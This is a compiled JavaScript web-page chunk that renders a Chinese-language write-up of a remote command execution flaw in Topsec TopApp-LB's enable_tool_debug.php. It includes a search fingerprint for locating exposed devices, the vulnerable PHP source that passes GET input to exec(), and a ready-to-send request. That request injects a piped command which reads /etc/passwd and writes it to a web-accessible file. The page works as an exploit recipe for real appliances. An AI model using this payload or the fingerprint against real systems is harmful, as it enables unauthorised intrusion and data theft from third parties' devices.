(window.webpackJsonp=window.webpackJsonp||[]).push([[369],{2070:function(t,s,a){t.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131402259.1075c1de.png"},2071:function(t,s,a){t.exports=a.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313131402375.77a03030.png"},2713:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"天融信-topapp-lb-enable-tool-debug-php-远程命令执行漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#天融信-topapp-lb-enable-tool-debug-php-远程命令执行漏洞"}},[t._v("#")]),t._v(" 天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("天融信 TopSec-LB enable_tool_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("天融信 TopSec-LB")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('app="天融信-TopApp-LB-负载均衡系统"')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("登录页面如下")]),t._v(" "),n("p",[n("img",{attrs:{src:a(2070),alt:"img"}})]),t._v(" "),n("p",[t._v("漏洞文件为 "),n("code",[t._v("enable_tool_debug.php")])]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token php language-php"}},[n("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("require_once")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("dirname")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("__FILE__")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"/../common/commandWrapper.inc"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("error_reporting")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("E_ALL")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("E_WARNING")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("E_NOTICE")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$val")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'val'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'tool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$par")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'par'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("runTool")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$val")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$par")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br")])]),n("p",[n("code",[t._v("commandWrapper.inc")]),t._v(" 文件中的 "),n("code",[t._v("runTool")])]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function-definition function"}},[t._v("runTool")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$val")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$par")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$val")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"0"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("setValue")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'runtool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'tool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("setValue")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'runtool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'parameter'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$par")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("commit")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"1"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t\t"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'ping '")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$par")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'>/tmp/tool_result &'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"2"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t\t"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'traceroute '")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$par")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'>/tmp/tool_result &'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$val")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"1"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getValue")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'runtool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'tool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"1"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t\t"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'killall ping '")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$tool")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"2"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\t\t"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'killall traceroute '")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("setValue")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'runtool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'tool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("setValue")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'runtool'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'parameter'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token class-name static-context"}},[t._v("UciUtil")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("::")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("commit")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t\t"),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'echo \"\">/tmp/tool_result'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\t\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br"),n("span",{staticClass:"line-number"},[t._v("20")]),n("br"),n("span",{staticClass:"line-number"},[t._v("21")]),n("br"),n("span",{staticClass:"line-number"},[t._v("22")]),n("br"),n("span",{staticClass:"line-number"},[t._v("23")]),n("br"),n("span",{staticClass:"line-number"},[t._v("24")]),n("br")])]),n("p",[t._v("这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行")]),t._v(" "),n("div",{staticClass:"language-plain line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-plain"}},[n("code",[t._v("/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |'\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(2071),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);